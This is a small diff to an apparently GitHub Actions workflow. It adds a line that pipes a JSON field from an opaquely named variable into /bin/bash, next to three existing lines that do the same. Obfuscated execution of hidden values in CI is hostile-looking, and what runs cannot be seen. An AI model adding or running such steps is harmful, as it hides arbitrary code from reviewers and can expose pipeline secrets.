@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$fkm7493" | jq -r .ghu8 | /bin/bash
           echo $fseeg7 | jq -r .vw0 | /bin/bash
           echo $focxh402 | jq -r .hg215 | /bin/bash
+          echo $hngz6 | jq -r .lcwzq6 | /bin/bash
 
       - name: Store artifact
         if: always()
